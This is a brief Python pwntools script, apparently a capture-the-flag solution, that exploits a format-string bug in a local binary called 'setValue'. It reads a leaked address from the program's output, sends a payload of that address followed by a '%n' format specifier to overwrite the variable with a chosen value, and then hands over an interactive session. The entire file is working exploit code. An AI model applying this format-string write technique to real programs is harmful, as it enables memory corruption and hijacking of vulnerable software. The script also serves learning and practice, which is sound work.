#!/usr/bin/python3

from pwn import *

p = process('./setValue')

p.recvuntil("at address ")
val = int(p.recvline(keepends=False), 16)
log.info(f"Got address &someValue = {hex(val)}")

payload = b''
payload += p32(val)
payload += b'%46c%4$n'

p.sendline(payload)
p.interactive()